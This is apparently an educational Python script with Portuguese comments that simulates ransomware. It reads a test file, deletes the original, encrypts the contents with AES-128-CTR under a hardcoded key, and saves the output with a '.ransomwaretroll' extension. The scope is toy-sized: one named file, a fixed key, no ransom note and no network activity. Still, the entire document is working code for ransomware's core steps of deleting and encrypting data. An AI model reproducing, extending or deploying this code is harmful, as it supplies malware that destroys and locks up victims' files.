import os  # Biblioteca para manipulação de arquivos e diretórios
import pyaes  # Biblioteca para criptografia AES

# Definir o nome do arquivo a ser criptografado
file_name = "teste.txt"

try:
    # Abrir o arquivo em modo de leitura binária
    with open(file_name, "rb") as file:
        file_data = file.read()  # Ler os dados do arquivo
    
    # Remover o arquivo original para simular comportamento de ransomware
    os.remove(file_name)
    
    # Definir uma chave de criptografia (16 bytes para AES-128)
    key = b"testeransomwares"  # A chave deve ter exatamente 16, 24 ou 32 bytes (AES-128, AES-192, AES-256)
    
    # Inicializar o modo de operação AES no modo CTR (Counter Mode)
    aes = pyaes.AESModeOfOperationCTR(key)
    
    # Criptografar os dados do arquivo
    crypto_data = aes.encrypt(file_data)
    
    # Criar um novo nome para o arquivo criptografado
    new_file_name = f"{file_name}.ransomwaretroll"
    
    # Salvar os dados criptografados em um novo arquivo
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)
    
    print(f"Arquivo '{file_name}' criptografado com sucesso para '{new_file_name}'.")

except FileNotFoundError:
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
except Exception as e:
    print(f"Ocorreu um erro: {e}")
